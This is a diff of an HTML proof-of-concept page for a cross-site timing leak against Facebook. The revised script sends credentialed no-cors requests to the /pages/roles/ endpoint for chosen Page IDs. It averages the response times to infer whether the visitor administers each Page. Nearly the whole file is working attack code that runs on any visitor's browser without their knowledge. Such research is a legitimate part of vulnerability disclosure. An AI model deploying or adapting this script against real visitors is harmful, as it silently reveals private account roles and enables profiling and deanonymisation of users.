@@ -2,76 +2,75 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Facebook XS-Leak PoC</title>
+  <title>Facebook Admin XS-Leak PoC</title>
   <style>
     body { font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; }
-    .result { padding: 10px; margin: 10px 0; border-radius: 5px; }
-    .accessible { background: #ffebee; border-left: 4px solid #f44336; }
-    .inaccessible { background: #e8f5e9; border-left: 4px solid #4caf50; }
+    .admin { background: #ffebee; border-left: 4px solid #f44336; }
+    .non-admin { background: #e8f5e9; border-left: 4px solid #4caf50; }
+    .result { padding: 15px; margin: 15px 0; border-radius: 5px; }
   </style>
 </head>
 <body>
-  <h1>Facebook Resource Access Timing Test</h1>
-  <p>This page demonstrates how response timing can reveal whether a user has access to specific Facebook resources.</p>
+  <h1>Facebook Page Admin Timing Leak</h1>
+  <p>Testing response times for <code>/pages/roles/</code> to detect admin status.</p>
   
   <div id="results"></div>
   
   <script>
-    const testCases = [
-      { url: "https://www.facebook.com/130676333456599", name: "Test Page (Likely Public)" },
-      { url: "https://www.facebook.com/groups/private-group-test", name: "Private Group (Members Only)" },
-      { url: "https://www.facebook.com/settings", name: "Settings Page (Logged-in Users)" }
+    // Your test pages (replace with actual IDs)
+    const TEST_PAGES = [
+      { 
+        id: "130676333456599", 
+        name: "Page I Admin (Expected: FAST)" 
+      },
+      { 
+        id: "110875921969003", 
+        name: "Page I Don't Admin (Expected: SLOW)" 
+      }
     ];
 
-    async function testTiming(url, name) {
-      const start = performance.now();
+    async function testPage(page) {
+      const url = `https://www.facebook.com/pages/roles/?id=${page.id}`;
+      const times = [];
       
-      try {
-        await fetch(url, {
-          mode: "no-cors",
-          credentials: "include",
-          cache: "no-store"
-        });
-      } catch (e) {
-        // Expected with no-cors
+      // Run 3 tests to average out noise
+      for (let i = 0; i < 3; i++) {
+        const start = performance.now();
+        try {
+          await fetch(url, {
+            method: 'GET',
+            mode: 'no-cors',
+            credentials: 'include',
+            cache: 'no-store',
+            headers: { 'Cache-Control': 'no-cache' }
+          });
+        } catch (e) { /* CORS errors expected */ }
+        const duration = performance.now() - start;
+        times.push(duration);
+        await new Promise(resolve => setTimeout(resolve, 1000)); // Delay between requests
       }
+
+      const avgTime = times.reduce((a, b) => a + b, 0) / times.length;
+      const isAdmin = avgTime < 800; // Adjust threshold based on your tests
       
-      const duration = performance.now() - start;
-      return { name, url, duration };
+      // Display results
+      const resultEl = document.createElement('div');
+      resultEl.className = `result ${isAdmin ? 'admin' : 'non-admin'}`;
+      resultEl.innerHTML = `
+        <h3>${page.name}</h3>
+        <p><strong>URL:</strong> <code>${url}</code></p>
+        <p><strong>Avg Time:</strong> ${avgTime.toFixed(2)}ms</p>
+        <p><strong>Conclusion:</strong> ${isAdmin ? 'ADMIN ACCESS' : 'Non-Admin'}</p>
+        <details>
+          <summary>Raw Timings</summary>
+          <pre>${JSON.stringify(times, null, 2)}</pre>
+        </details>
+      `;
+      document.getElementById('results').appendChild(resultEl);
     }
 
-    async function runTests() {
-      const resultsEl = document.getElementById('results');
-      resultsEl.innerHTML = '<h2>Testing...</h2>';
-      
-      for (const test of testCases) {
-        // Run multiple times for consistency
-        const durations = [];
-        for (let i = 0; i < 3; i++) {
-          const result = await testTiming(test.url, test.name);
-          durations.push(result.duration);
-          await new Promise(resolve => setTimeout(resolve, 1000));
-        }
-        
-        const avgDuration = durations.reduce((a,b) => a + b, 0) / durations.length;
-        const isAccessible = avgDuration < 1000; // Adjust threshold based on your tests
-        
-        const resultEl = document.createElement('div');
-        resultEl.className = `result ${isAccessible ? 'accessible' : 'inaccessible'}`;
-        resultEl.innerHTML = `
-          <h3>${test.name}</h3>
-          <p>URL: ${test.url}</p>
-          <p>Average Response Time: ${avgDuration.toFixed(2)}ms</p>
-          <p>Conclusion: ${isAccessible ? 'Likely ACCESSIBLE' : 'Likely INACCESSIBLE'}</p>
-        `;
-        resultsEl.appendChild(resultEl);
-        
-        console.log(`[TEST] ${test.name} - Avg: ${avgDuration.toFixed(2)}ms - ${isAccessible ? 'ACCESSIBLE' : 'INACCESSIBLE'}`);
-      }
-    }
-
-    // Start tests after page load
-    window.addEventListener('load', runTests);
+    // Run tests
+    TEST_PAGES.forEach(testPage);
   </script>
 </body>
 </html>
